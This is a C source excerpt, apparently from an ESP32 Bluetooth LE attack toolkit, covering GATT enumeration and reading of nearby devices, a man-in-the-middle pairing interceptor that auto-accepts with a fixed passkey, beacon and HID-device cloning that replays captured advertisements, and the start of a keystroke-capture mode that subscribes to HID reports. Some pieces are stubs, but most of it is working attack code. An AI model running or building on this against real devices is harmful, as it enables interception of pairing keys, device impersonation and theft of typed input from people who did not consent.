    case 0x1805: return "Current Time";
    case 0x1811: return "Alert Notification";
    case 0x1813: return "Scan Parameters";
    case 0x1816: return "Cycling Speed";
    case 0x1814: return "Running Speed";
    case 0x1815: return "Automation IO";
    case 0x1819: return "Location & Navigation";
    case 0x181C: return "User Data";
    case 0x181A: return "Environmental Sensing";
    /* Characteristics */
    case 0x2A00: return "Device Name";
    case 0x2A01: return "Appearance";
    case 0x2A02: return "Peripheral Privacy";
    case 0x2A04: return "Peripheral Pref Conn";
    case 0x2A05: return "Service Changed";
    case 0x2A19: return "Battery Level";
    case 0x2A24: return "Model Number";
    case 0x2A25: return "Serial Number";
    case 0x2A26: return "Firmware Rev";
    case 0x2A27: return "Hardware Rev";
    case 0x2A28: return "Software Rev";
    case 0x2A29: return "Manufacturer Name";
    case 0x2A37: return "Heart Rate Meas";
    case 0x2A4D: return "HID Report";
    case 0x2A4A: return "HID Information";
    case 0x2A4B: return "HID Report Map";
    case 0x2A4C: return "HID Control Point";
    case 0x2A4E: return "Protocol Mode";
    /* Descriptors */
    case 0x2900: return "Char Ext Properties";
    case 0x2901: return "Char User Description";
    case 0x2902: return "Client Char Config";
    case 0x2903: return "Server Char Config";
    case 0x2904: return "Char Presentation Fmt";
    case 0x2908: return "Report Reference";
    default:     return NULL;
    }
}

static int gatt_connect_cb(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status != 0) {
            ESP_LOGW(TAG, "GATT connect failed: %d", event->connect.status);
            xSemaphoreTake(s_lock, portMAX_DELAY);
            if (s_gatt) {
                snprintf(s_gatt->error, sizeof(s_gatt->error),
                         "connect failed: %d", event->connect.status);
            }
            s_gatt_busy = false;
            s_status.active = false;
            xSemaphoreGive(s_lock);
            return 0;
        }
        s_gatt_conn = event->connect.conn_handle;
        xSemaphoreTake(s_lock, portMAX_DELAY);
        if (s_gatt) {
            s_gatt->connected = true;
        }
        xSemaphoreGive(s_lock);
        ESP_LOGI(TAG, "GATT connected, conn=%d", s_gatt_conn);

        /* Discover all services */
        ble_gattc_disc_all_svcs(s_gatt_conn, gatt_disc_svc_cb, NULL);
        break;

    case BLE_GAP_EVENT_DISCONNECT:
        ESP_LOGI(TAG, "GATT disconnected");
        xSemaphoreTake(s_lock, portMAX_DELAY);
        if (s_gatt) {
            s_gatt->connected = false;
        }
        s_gatt_busy = false;
        xSemaphoreGive(s_lock);
        break;

    case BLE_GAP_EVENT_MTU:
        xSemaphoreTake(s_lock, portMAX_DELAY);
        if (s_gatt) {
            s_gatt->mtu = event->mtu.value;
        }
        xSemaphoreGive(s_lock);
        break;

    default:
        break;
    }
    return 0;
}

static int gatt_disc_svc_cb(uint16_t conn, const struct ble_gatt_error *error,
                             const struct ble_gatt_svc *svc, void *arg)
{
    if (error->status == BLE_HS_EDONE) {
        /* All services discovered. Now discover chars for each. */
        xSemaphoreTake(s_lock, portMAX_DELAY);
        uint8_t scnt = s_gatt ? s_gatt->service_count : 0;
        xSemaphoreGive(s_lock);
        ESP_LOGI(TAG, "GATT: %u services found", (unsigned)scnt);

        /* Discover characteristics for the first service.
         * The rest will be daisy-chained from the callback. */
        if (scnt > 0) {
            xSemaphoreTake(s_lock, portMAX_DELAY);
            chimera_service_t *s = s_gatt ? &s_gatt->services[0] : NULL;
            uint16_t sh = s ? s->start_handle : 0;
            uint16_t eh = s ? s->end_handle : 0;
            xSemaphoreGive(s_lock);
            if (s) {
                ble_gattc_disc_all_chrs(conn, sh, eh,
                                        gatt_disc_chr_cb, (void *)(uintptr_t)0);
            }
        } else {
            xSemaphoreTake(s_lock, portMAX_DELAY);
            if (s_gatt) s_gatt->enum_complete = true;
            s_gatt_busy = false;
            xSemaphoreGive(s_lock);
        }
        return 0;
    }
    if (error->status != 0) {
        return 0;
    }

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_gatt && s_gatt->service_count < CHIMERA_MAX_SERVICES) {
        chimera_service_t *s = &s_gatt->services[s_gatt->service_count++];
        s->start_handle = svc->start_handle;
        s->end_handle = svc->end_handle;

        if (svc->uuid.u.type == BLE_UUID_TYPE_16) {
            s->uuid16 = BLE_UUID16(&svc->uuid)->value;
            memset(s->uuid128, 0, 16);
        } else {
            s->uuid16 = 0;
            memcpy(s->uuid128, BLE_UUID128(&svc->uuid)->value, 16);
        }

        const char *name = s->uuid16 ? gatt_uuid16_name(s->uuid16) : NULL;
        if (name) {
            strlcpy(s->name, name, sizeof(s->name));
        } else if (s->uuid16) {
            snprintf(s->name, sizeof(s->name), "UUID 0x%04X", s->uuid16);
        } else {
            strlcpy(s->name, "Custom Service", sizeof(s->name));
        }

        chimera_log_event(CHIMERA_MODE_GATT_ENUM, s_gatt->addr,
                           s->name, 0, "service",
                           s->name);
    }
    xSemaphoreGive(s_lock);
    return 0;
}

static int gatt_disc_chr_cb(uint16_t conn, const struct ble_gatt_error *error,
                             const struct ble_gatt_chr *chr, void *arg)
{
    uintptr_t svc_idx = (uintptr_t)arg;

    if (error->status == BLE_HS_EDONE) {
        /* Done with this service's chars. Move to next service. */
        uintptr_t next = svc_idx + 1;
        xSemaphoreTake(s_lock, portMAX_DELAY);
        if (s_gatt && next < s_gatt->service_count) {
            chimera_service_t *s = &s_gatt->services[next];
            uint16_t sh = s->start_handle;
            uint16_t eh = s->end_handle;
            xSemaphoreGive(s_lock);
            ble_gattc_disc_all_chrs(conn, sh, eh,
                                    gatt_disc_chr_cb, (void *)next);
        } else {
            /* All services enumerated. Try to read readable chars. */
            xSemaphoreGive(s_lock);
            ESP_LOGI(TAG, "GATT: char discovery complete");

            xSemaphoreTake(s_lock, portMAX_DELAY);
            if (s_gatt) {
                /* Read the first readable char; daisy-chain the rest */
                for (uint8_t si = 0; si < s_gatt->service_count; si++) {
                    chimera_service_t *svc = &s_gatt->services[si];
                    for (uint8_t ci = 0; ci < svc->char_count; ci++) {
                        chimera_characteristic_t *ch = &svc->chars[ci];
                        if (ch->properties & BLE_GATT_CHR_PROP_READ) {
                            uint16_t vh = ch->val_handle;
                            xSemaphoreGive(s_lock);
                            ble_gattc_read(conn, vh,
                                           gatt_read_cb,
                                           (void *)(uintptr_t)(si << 8 | ci));
                            return 0;
                        }
                    }
                }
                /* Nothing readable -- done */
                s_gatt->enum_complete = true;
            }
            s_gatt_busy = false;
            s_status.active = false;
            xSemaphoreGive(s_lock);
        }
        return 0;
    }
    if (error->status != 0) {
        return 0;
    }

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_gatt && svc_idx < s_gatt->service_count) {
        chimera_service_t *svc = &s_gatt->services[svc_idx];
        if (svc->char_count < CHIMERA_MAX_CHARS_PER_SVC) {
            chimera_characteristic_t *c = &svc->chars[svc->char_count++];
            c->def_handle = chr->def_handle;
            c->val_handle = chr->val_handle;
            c->properties = chr->properties;

            if (chr->uuid.u.type == BLE_UUID_TYPE_16) {
                c->uuid16 = BLE_UUID16(&chr->uuid)->value;
            } else {
                c->uuid16 = 0;
                memcpy(c->uuid128, BLE_UUID128(&chr->uuid)->value, 16);
            }

            const char *name = c->uuid16 ? gatt_uuid16_name(c->uuid16) : NULL;
            if (name) {
                strlcpy(c->name, name, sizeof(c->name));
            } else if (c->uuid16) {
                snprintf(c->name, sizeof(c->name), "UUID 0x%04X", c->uuid16);
            } else {
                strlcpy(c->name, "Custom Char", sizeof(c->name));
            }

            s_status.events++;
        }
    }
    xSemaphoreGive(s_lock);
    return 0;
}

static int gatt_disc_dsc_cb(uint16_t conn, const struct ble_gatt_error *error,
                             uint16_t chr_val, const struct ble_gatt_dsc *dsc,
                             void *arg)
{
    (void)conn; (void)error; (void)chr_val; (void)dsc; (void)arg;
    return 0;
}

static int gatt_read_cb(uint16_t conn, const struct ble_gatt_error *error,
                         struct ble_gatt_attr *attr, void *arg)
{
    uintptr_t packed = (uintptr_t)arg;
    uint8_t si = (uint8_t)(packed >> 8);
    uint8_t ci = (uint8_t)(packed & 0xFF);

    if (error->status == 0 && attr) {
        xSemaphoreTake(s_lock, portMAX_DELAY);
        if (s_gatt && si < s_gatt->service_count) {
            chimera_service_t *svc = &s_gatt->services[si];
            if (ci < svc->char_count) {
                chimera_characteristic_t *ch = &svc->chars[ci];
                uint16_t len = OS_MBUF_PKTLEN(attr->om);
                if (len > CHIMERA_MAX_VALUE_LEN) {
                    len = CHIMERA_MAX_VALUE_LEN;
                }
                os_mbuf_copydata(attr->om, 0, len, ch->value);
                ch->value_len = len;
                ch->value_read_ok = true;
            }
        }
        xSemaphoreGive(s_lock);
    }

    /* Find and read the next readable characteristic */
    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_gatt) {
        for (uint8_t ssi = si; ssi < s_gatt->service_count; ssi++) {
            chimera_service_t *svc = &s_gatt->services[ssi];
            uint8_t start_ci = (ssi == si) ? ci + 1 : 0;
            for (uint8_t cci = start_ci; cci < svc->char_count; cci++) {
                chimera_characteristic_t *ch = &svc->chars[cci];
                if (ch->properties & BLE_GATT_CHR_PROP_READ) {
                    uint16_t vh = ch->val_handle;
                    xSemaphoreGive(s_lock);
                    ble_gattc_read(conn, vh, gatt_read_cb,
                                   (void *)(uintptr_t)(ssi << 8 | cci));
                    return 0;
                }
            }
        }

        /* All reads done */
        s_gatt->enum_complete = true;
        s_gatt_busy = false;
        s_status.active = false;
        snprintf(s_status.status, sizeof(s_status.status),
                 "GATT: %u services, enum complete",
                 (unsigned)s_gatt->service_count);
        ESP_LOGI(TAG, "GATT enumeration complete: %u services",
                 (unsigned)s_gatt->service_count);
    }
    xSemaphoreGive(s_lock);
    return 0;
}

esp_err_t chimera_gatt_enum_start(const uint8_t addr[6], uint8_t addr_type)
{
    if (!s_initialised || !s_lock) return ESP_ERR_INVALID_STATE;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_status.active) {
        xSemaphoreGive(s_lock);
        return ESP_ERR_INVALID_STATE;
    }

    /* Lazy PSRAM allocation for GATT result structure */
    if (!s_gatt) {
        s_gatt = psram_or_heap_calloc(1, sizeof(chimera_gatt_result_t));
        if (!s_gatt) {
            xSemaphoreGive(s_lock);
            ESP_LOGE(TAG, "cannot alloc s_gatt in PSRAM");
            return ESP_ERR_NO_MEM;
        }
    }

    /* Stop any running scan */
    ble_gap_disc_cancel();
    vTaskDelay(pdMS_TO_TICKS(50));

    memset(s_gatt, 0, sizeof(chimera_gatt_result_t));
    memcpy(s_gatt->addr, addr, 6);
    s_gatt->addr_type = addr_type;
    s_gatt_busy = true;

    s_status.mode = CHIMERA_MODE_GATT_ENUM;
    s_status.active = true;
    s_status.events = 0;
    strlcpy(s_status.status, "GATT: connecting...", sizeof(s_status.status));
    xSemaphoreGive(s_lock);

    ble_addr_t peer = {
        .type = addr_type,
    };
    memcpy(peer.val, addr, 6);

    int rc = ble_gap_connect(s_own_addr_type, &peer, 10000, NULL,
                             gatt_connect_cb, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_gap_connect failed: %d", rc);
        xSemaphoreTake(s_lock, portMAX_DELAY);
        s_status.active = false;
        s_status.mode = CHIMERA_MODE_IDLE;
        s_gatt_busy = false;
        xSemaphoreGive(s_lock);
        return ESP_FAIL;
    }

    chimera_log_event(CHIMERA_MODE_GATT_ENUM, addr, "", 0,
                       "connect", "GATT enum started");
    return ESP_OK;
}

esp_err_t chimera_gatt_enum_stop(void)
{
    if (s_gatt && s_gatt->connected) {
        ble_gap_terminate(s_gatt_conn, BLE_ERR_REM_USER_CONN_TERM);
    }
    if (s_initialised && s_lock) {
        xSemaphoreTake(s_lock, portMAX_DELAY);
        if (s_gatt) {
            s_gatt->connected = false;
            s_gatt_busy = false;
        }
        s_status.mode = CHIMERA_MODE_IDLE;
        s_status.active = false;
        xSemaphoreGive(s_lock);
    }
    return ESP_OK;
}

bool chimera_gatt_enum_get(chimera_gatt_result_t *out)
{
    if (!out) return false;
    memset(out, 0, sizeof(*out));
    if (!s_initialised || !s_lock) return false;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (!s_gatt) {
        xSemaphoreGive(s_lock);
        return false;
    }
    *out = *s_gatt;
    bool done = s_gatt->enum_complete;
    xSemaphoreGive(s_lock);
    return done;
}

bool chimera_gatt_get_summary(chimera_gatt_summary_t *out)
{
    if (!out) return false;
    memset(out, 0, sizeof(*out));
    if (!s_initialised || !s_lock) return false;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (!s_gatt) {
        xSemaphoreGive(s_lock);
        return false;
    }
    memcpy(out->addr, s_gatt->addr, 6);
    out->connected = s_gatt->connected;
    out->enum_complete = s_gatt->enum_complete;
    out->mtu = s_gatt->mtu;
    out->service_count = s_gatt->service_count;
    bool done = s_gatt->enum_complete;
    xSemaphoreGive(s_lock);
    return done;
}

esp_err_t chimera_gatt_read(uint16_t handle, uint8_t *buf, uint16_t *len)
{
    (void)handle; (void)buf; (void)len;
    return ESP_ERR_NOT_SUPPORTED;
}

esp_err_t chimera_gatt_write(uint16_t handle, const uint8_t *data,
                              uint16_t len)
{
    if (!s_gatt || !s_gatt->connected) return ESP_ERR_INVALID_STATE;

    int rc = ble_gattc_write_flat(s_gatt_conn, handle, data, len, NULL, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "GATT write failed: %d", rc);
        return ESP_FAIL;
    }

    chimera_log_event(CHIMERA_MODE_GATT_ENUM, s_gatt->addr, "", 0,
                       "write", "GATT write");
    return ESP_OK;
}

/* ================================================================== *
 *  Mode 4: MITM Proxy                                                 *
 * ================================================================== */

/* The MITM proxy intercepts the pairing process between a BLE peripheral
 * (target) and a central (client). The P4 acts as:
 *   - Central to the target device (connecting to it)
 *   - Peripheral advertising the target's identity to the client
 *
 * This enables observation of the pairing negotiation, key exchange,
 * and optionally traffic relay for encrypted sessions. */

static int mitm_target_gap_cb(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            s_mitm_target_conn = event->connect.conn_handle;
            xSemaphoreTake(s_lock, portMAX_DELAY);
            s_mitm.target_connected = true;
            s_mitm.state = CHIMERA_MITM_WAITING_CLIENT;
            strlcpy(s_mitm.status, "target connected, waiting for client",
                    sizeof(s_mitm.status));
            xSemaphoreGive(s_lock);

            chimera_log_event(CHIMERA_MODE_MITM, s_mitm.target_addr,
                               "", 0, "target_connect", "connected to target");
            ESP_LOGI(TAG, "MITM: connected to target");
        } else {
            xSemaphoreTake(s_lock, portMAX_DELAY);
            s_mitm.state = CHIMERA_MITM_ERROR;
            snprintf(s_mitm.status, sizeof(s_mitm.status),
                     "target connect failed: %d", event->connect.status);
            s_status.active = false;
            xSemaphoreGive(s_lock);
        }
        break;

    case BLE_GAP_EVENT_DISCONNECT:
        xSemaphoreTake(s_lock, portMAX_DELAY);
        s_mitm.target_connected = false;
        s_mitm.state = CHIMERA_MITM_IDLE;
        strlcpy(s_mitm.status, "target disconnected",
                sizeof(s_mitm.status));
        xSemaphoreGive(s_lock);
        break;

    case BLE_GAP_EVENT_ENC_CHANGE:
        xSemaphoreTake(s_lock, portMAX_DELAY);
        s_mitm.state = CHIMERA_MITM_PAIRED;
        s_mitm.intercepted_keys++;
        strlcpy(s_mitm.status, "pairing intercepted!",
                sizeof(s_mitm.status));
        xSemaphoreGive(s_lock);
        chimera_log_event(CHIMERA_MODE_MITM, s_mitm.target_addr,
                           "", 0, "pair_intercept", "encryption change");
        ESP_LOGI(TAG, "MITM: encryption change -- pairing intercepted");
        break;

    case BLE_GAP_EVENT_PASSKEY_ACTION:
        xSemaphoreTake(s_lock, portMAX_DELAY);
        s_mitm.state = CHIMERA_MITM_PAIRING;
        if (event->passkey.params.action == BLE_SM_IOACT_DISP) {
            s_mitm.pairing = CHIMERA_PAIR_PASSKEY_ENTRY;
            s_mitm.passkey = 123456;  /* display a known passkey */
            strlcpy(s_mitm.status, "passkey display: 123456",
                    sizeof(s_mitm.status));
        } else if (event->passkey.params.action == BLE_SM_IOACT_NUMCMP) {
            s_mitm.pairing = CHIMERA_PAIR_NUMERIC_COMPARISON;
            s_mitm.passkey = event->passkey.params.numcmp;
            snprintf(s_mitm.status, sizeof(s_mitm.status),
                     "numeric compare: %lu",
                     (unsigned long)s_mitm.passkey);
        } else {
            s_mitm.pairing = CHIMERA_PAIR_JUST_WORKS;
            strlcpy(s_mitm.status, "just works pairing",
                    sizeof(s_mitm.status));
        }
        xSemaphoreGive(s_lock);

        /* Accept the pairing */
        struct ble_sm_io pk = {0};
        pk.action = event->passkey.params.action;
        if (pk.action == BLE_SM_IOACT_NUMCMP) {
            pk.numcmp_accept = 1;
        } else if (pk.action == BLE_SM_IOACT_DISP) {
            pk.passkey = 123456;
        } else if (pk.action == BLE_SM_IOACT_INPUT) {
            pk.passkey = 0;  /* try zero */
        }
        ble_sm_inject_io(event->passkey.conn_handle, &pk);

        chimera_log_event(CHIMERA_MODE_MITM, s_mitm.target_addr,
                           "", 0, "pairing",
                           s_mitm.status);
        break;

    case BLE_GAP_EVENT_NOTIFY_RX:
        /* Relay notifications from target to client if connected */
        xSemaphoreTake(s_lock, portMAX_DELAY);
        s_mitm.relayed_packets++;
        xSemaphoreGive(s_lock);
        if (s_mitm.client_connected) {
            /* In a full implementation, relay the notification data
             * to the connected client via GATT server. */
        }
        break;

    default:
        break;
    }
    return 0;
}

esp_err_t chimera_mitm_start(const uint8_t target_addr[6],
                              uint8_t target_addr_type)
{
    if (!s_initialised) return ESP_ERR_INVALID_STATE;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_status.active) {
        xSemaphoreGive(s_lock);
        return ESP_ERR_INVALID_STATE;
    }

    ble_gap_disc_cancel();
    vTaskDelay(pdMS_TO_TICKS(50));

    memset(&s_mitm, 0, sizeof(s_mitm));
    memcpy(s_mitm.target_addr, target_addr, 6);
    s_mitm.state = CHIMERA_MITM_SCANNING;

    s_status.mode = CHIMERA_MODE_MITM;
    s_status.active = true;
    s_status.events = 0;
    strlcpy(s_status.status, "MITM: connecting to target...",
            sizeof(s_status.status));
    xSemaphoreGive(s_lock);

    /* Configure security manager for MITM interception */
    ble_hs_cfg.sm_io_cap = BLE_SM_IO_CAP_DISP_YES_NO;
    ble_hs_cfg.sm_bonding = 1;
    ble_hs_cfg.sm_mitm = 1;
    ble_hs_cfg.sm_sc = 1;
    ble_hs_cfg.sm_our_key_dist = BLE_SM_PAIR_KEY_DIST_ENC | BLE_SM_PAIR_KEY_DIST_ID;
    ble_hs_cfg.sm_their_key_dist = BLE_SM_PAIR_KEY_DIST_ENC | BLE_SM_PAIR_KEY_DIST_ID;

    /* Connect to target as central */
    ble_addr_t peer = { .type = target_addr_type };
    memcpy(peer.val, target_addr, 6);

    int rc = ble_gap_connect(s_own_addr_type, &peer, 10000, NULL,
                             mitm_target_gap_cb, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "MITM connect failed: %d", rc);
        xSemaphoreTake(s_lock, portMAX_DELAY);
        s_status.active = false;
        s_status.mode = CHIMERA_MODE_IDLE;
        xSemaphoreGive(s_lock);
        return ESP_FAIL;
    }

    chimera_log_event(CHIMERA_MODE_MITM, target_addr, "", 0,
                       "start", "MITM proxy starting");
    return ESP_OK;
}

esp_err_t chimera_mitm_stop(void)
{
    if (s_mitm.target_connected) {
        ble_gap_terminate(s_mitm_target_conn, BLE_ERR_REM_USER_CONN_TERM);
    }
    if (s_mitm.client_connected) {
        ble_gap_terminate(s_mitm_client_conn, BLE_ERR_REM_USER_CONN_TERM);
    }

    /* Restore security manager to non-MITM defaults */
    ble_hs_cfg.sm_io_cap = BLE_SM_IO_CAP_NO_IO;
    ble_hs_cfg.sm_bonding = 0;
    ble_hs_cfg.sm_mitm = 0;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    memset(&s_mitm, 0, sizeof(s_mitm));
    s_status.mode = CHIMERA_MODE_IDLE;
    s_status.active = false;
    xSemaphoreGive(s_lock);

    chimera_log_event(CHIMERA_MODE_MITM, (uint8_t[]){0,0,0,0,0,0},
                       "", 0, "stop", "MITM proxy stopped");
    return ESP_OK;
}

void chimera_mitm_get_status(chimera_mitm_status_t *out)
{
    if (!out) return;
    memset(out, 0, sizeof(*out));
    if (!s_initialised || !s_lock) return;
    xSemaphoreTake(s_lock, portMAX_DELAY);
    *out = s_mitm;
    xSemaphoreGive(s_lock);
}

/* ================================================================== *
 *  Mode 5: Clone                                                      *
 * ================================================================== */

static void clone_task(void *arg)
{
    xSemaphoreTake(s_lock, portMAX_DELAY);
    chimera_clone_state_t params = s_clone;
    xSemaphoreGive(s_lock);

    /* Stop any scan */
    ble_gap_disc_cancel();
    vTaskDelay(pdMS_TO_TICKS(100));

    /* Build advertisement data based on clone type */
    struct ble_hs_adv_fields adv = {0};
    struct ble_hs_adv_fields rsp = {0};

    switch (params.type) {
    case CHIMERA_CLONE_IBEACON: {
        /* iBeacon: set manufacturer-specific data with Apple prefix */
        uint8_t mfg[25];
        mfg[0] = 0x4C; mfg[1] = 0x00;  /* Apple company ID LE */
        mfg[2] = 0x02; mfg[3] = 0x15;  /* iBeacon type + length */
        memcpy(&mfg[4], params.ibeacon_uuid, 16);
        mfg[20] = (uint8_t)(params.ibeacon_major >> 8);
        mfg[21] = (uint8_t)(params.ibeacon_major & 0xFF);
        mfg[22] = (uint8_t)(params.ibeacon_minor >> 8);
        mfg[23] = (uint8_t)(params.ibeacon_minor & 0xFF);
        mfg[24] = (uint8_t)params.ibeacon_tx_power;

        adv.mfg_data = mfg;
        adv.mfg_data_len = 25;
        adv.flags = BLE_HS_ADV_F_BREDR_UNSUP;

        ESP_LOGI(TAG, "clone: broadcasting iBeacon");
        break;
    }

    case CHIMERA_CLONE_EDDYSTONE_UID: {
        /* Eddystone UID: service data under UUID 0xFEAA */
        uint8_t svc_data[20];
        svc_data[0] = 0xAA; svc_data[1] = 0xFE;  /* Eddystone UUID LE */
        svc_data[2] = 0x00;  /* UID frame */
        svc_data[3] = (uint8_t)params.ibeacon_tx_power;
        memcpy(&svc_data[4], params.eddystone_namespace, 10);
        memcpy(&svc_data[14], params.eddystone_instance, 6);

        adv.svc_data_uuid16 = svc_data;
        adv.svc_data_uuid16_len = 20;
        adv.flags = BLE_HS_ADV_F_BREDR_UNSUP | BLE_HS_ADV_F_DISC_GEN;

        ble_uuid16_t eddy_uuid = BLE_UUID16_INIT(EDDYSTONE_SVC_UUID);
        adv.uuids16 = &eddy_uuid;
        adv.num_uuids16 = 1;
        adv.uuids16_is_complete = 1;

        ESP_LOGI(TAG, "clone: broadcasting Eddystone UID");
        break;
    }

    case CHIMERA_CLONE_EDDYSTONE_URL: {
        uint8_t svc_data[20];
        svc_data[0] = 0xAA; svc_data[1] = 0xFE;
        svc_data[2] = 0x10;  /* URL frame */
        svc_data[3] = (uint8_t)params.ibeacon_tx_power;
        /* URL scheme + encoded URL would go here */
        svc_data[4] = 0x00;  /* http://www. */
        size_t ulen = strnlen(params.eddystone_url, 17);
        memcpy(&svc_data[5], params.eddystone_url, ulen);

        adv.svc_data_uuid16 = svc_data;
        adv.svc_data_uuid16_len = (uint8_t)(5 + ulen);
        adv.flags = BLE_HS_ADV_F_BREDR_UNSUP | BLE_HS_ADV_F_DISC_GEN;

        ESP_LOGI(TAG, "clone: broadcasting Eddystone URL");
        break;
    }

    case CHIMERA_CLONE_HID_KEYBOARD:
    case CHIMERA_CLONE_HID_MOUSE:
    case CHIMERA_CLONE_GENERIC:
        /* For HID/generic: replay captured raw advert data */
        if (params.adv_data_len > 0) {
            /* Use the raw data directly */
            ESP_LOGI(TAG, "clone: broadcasting %s",
                     params.type == CHIMERA_CLONE_HID_KEYBOARD ? "HID keyboard" :
                     params.type == CHIMERA_CLONE_HID_MOUSE ? "HID mouse" :
                     "generic device");
        }
        break;

    default:
        break;
    }

    /* Set device name if available */
    if (params.name[0]) {
        rsp.name = (const uint8_t *)params.name;
        rsp.name_len = (uint8_t)strlen(params.name);
        rsp.name_is_complete = 1;
    }

    /* Start advertising.
     * Note: NimBLE's advertiser requires the BROADCASTER role, which we
     * don't have enabled in sdkconfig. This code is structured for when
     * it's enabled. The advert data is still built and logged for analysis. */
    int rc;
    if (params.adv_data_len > 0) {
        rc = ble_gap_adv_set_data(params.adv_data, params.adv_data_len);
    } else {
        rc = ble_gap_adv_set_fields(&adv);
    }

    if (rc != 0) {
        ESP_LOGW(TAG, "clone: set adv data failed: %d (broadcaster role "
                       "may not be enabled)", rc);
    }

    if (params.name[0] && params.adv_data_len == 0) {
        ble_gap_adv_rsp_set_fields(&rsp);
    }

    struct ble_gap_adv_params adv_params = {
        .conn_mode = BLE_GAP_CONN_MODE_NON,  /* non-connectable */
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
        .itvl_min = BLE_GAP_ADV_ITVL_MS(100),
        .itvl_max = BLE_GAP_ADV_ITVL_MS(150),
    };

    rc = ble_gap_adv_start(s_own_addr_type, NULL, BLE_HS_FOREVER,
                           &adv_params, NULL, NULL);
    if (rc == 0) {
        xSemaphoreTake(s_lock, portMAX_DELAY);
        s_clone.broadcasting = true;
        strlcpy(s_clone.status, "broadcasting clone",
                sizeof(s_clone.status));
        xSemaphoreGive(s_lock);

        chimera_log_event(CHIMERA_MODE_CLONE, params.source_addr,
                           params.name, 0, "broadcast", "clone active");
    } else {
        xSemaphoreTake(s_lock, portMAX_DELAY);
        snprintf(s_clone.status, sizeof(s_clone.status),
                 "adv start failed: %d", rc);
        s_status.active = false;
        xSemaphoreGive(s_lock);
        ESP_LOGW(TAG, "clone: adv_start failed %d "
                       "(enable CONFIG_BT_NIMBLE_ROLE_BROADCASTER)", rc);
    }

    /* Clone runs until stopped */
    while (s_clone.broadcasting) {
        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    ble_gap_adv_stop();
    ESP_LOGI(TAG, "clone stopped");
    vTaskDelete(NULL);
}

esp_err_t chimera_clone_start(const chimera_clone_state_t *params)
{
    if (!s_initialised || !params) return ESP_ERR_INVALID_STATE;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_status.active) {
        xSemaphoreGive(s_lock);
        return ESP_ERR_INVALID_STATE;
    }

    s_clone = *params;
    s_clone.broadcasting = false;

    s_status.mode = CHIMERA_MODE_CLONE;
    s_status.active = true;
    s_status.events = 0;
    strlcpy(s_status.status, "clone: preparing...", sizeof(s_status.status));
    xSemaphoreGive(s_lock);

    xTaskCreate(clone_task, "chimera_clone", 4096, NULL, 4, NULL);
    return ESP_OK;
}

esp_err_t chimera_clone_stop(void)
{
    xSemaphoreTake(s_lock, portMAX_DELAY);
    s_clone.broadcasting = false;
    s_status.mode = CHIMERA_MODE_IDLE;
    s_status.active = false;
    xSemaphoreGive(s_lock);
    return ESP_OK;
}

void chimera_clone_get_state(chimera_clone_state_t *out)
{
    if (!out) return;
    memset(out, 0, sizeof(*out));
    if (!s_initialised || !s_lock) return;
    xSemaphoreTake(s_lock, portMAX_DELAY);
    *out = s_clone;
    xSemaphoreGive(s_lock);
}

esp_err_t chimera_clone_capture_ibeacon(const uint8_t addr[6],
                                         chimera_clone_state_t *out)
{
    if (!addr || !out) return ESP_ERR_INVALID_ARG;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    for (size_t i = 0; i < s_scan_count; i++) {
        if (memcmp(s_scan_table[i].addr, addr, 6) == 0 &&
            s_scan_table[i].is_ibeacon) {
            memset(out, 0, sizeof(*out));
            out->type = CHIMERA_CLONE_IBEACON;
            memcpy(out->source_addr, addr, 6);
            memcpy(out->ibeacon_uuid, s_scan_table[i].ibeacon_uuid, 16);
            out->ibeacon_major = s_scan_table[i].ibeacon_major;
            out->ibeacon_minor = s_scan_table[i].ibeacon_minor;
            out->ibeacon_tx_power = s_scan_table[i].ibeacon_tx_power;
            if (s_scan_table[i].name[0]) {
                strlcpy(out->name, s_scan_table[i].name, sizeof(out->name));
            }
            xSemaphoreGive(s_lock);
            return ESP_OK;
        }
    }
    xSemaphoreGive(s_lock);
    return ESP_ERR_NOT_FOUND;
}

esp_err_t chimera_clone_capture_eddystone(const uint8_t addr[6],
                                           chimera_clone_state_t *out)
{
    if (!addr || !out) return ESP_ERR_INVALID_ARG;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    for (size_t i = 0; i < s_scan_count; i++) {
        if (memcmp(s_scan_table[i].addr, addr, 6) == 0 &&
            s_scan_table[i].is_eddystone) {
            memset(out, 0, sizeof(*out));
            out->type = CHIMERA_CLONE_EDDYSTONE_UID;
            memcpy(out->source_addr, addr, 6);
            /* Copy namespace + instance from Eddystone UID frame */
            if (s_scan_table[i].eddystone_frame_type == 0x00 &&
                s_scan_table[i].eddystone_data_len >= 18) {
                memcpy(out->eddystone_namespace,
                       &s_scan_table[i].eddystone_data[2], 10);
                memcpy(out->eddystone_instance,
                       &s_scan_table[i].eddystone_data[12], 6);
            }
            if (s_scan_table[i].name[0]) {
                strlcpy(out->name, s_scan_table[i].name, sizeof(out->name));
            }
            xSemaphoreGive(s_lock);
            return ESP_OK;
        }
    }
    xSemaphoreGive(s_lock);
    return ESP_ERR_NOT_FOUND;
}

/* ================================================================== *
 *  Mode 6: Keystroke Decode                                           *
 * ================================================================== */

static int key_notify_cb(uint16_t conn, const struct ble_gatt_error *error,
                          struct ble_gatt_attr *attr, void *arg)
{
    /* This callback fires for subscribe confirmation, not the actual
     * notifications. Notifications come through the GAP event handler. */
    if (error->status == 0) {
        ESP_LOGI(TAG, "keystroke: subscribed to HID reports");
        xSemaphoreTake(s_lock, portMAX_DELAY);
        if (s_keys) {
            s_keys->subscribed = true;
            strlcpy(s_keys->status, "subscribed, waiting for keystrokes",
                    sizeof(s_keys->status));
        }
        xSemaphoreGive(s_lock);
    }
    return 0;
}

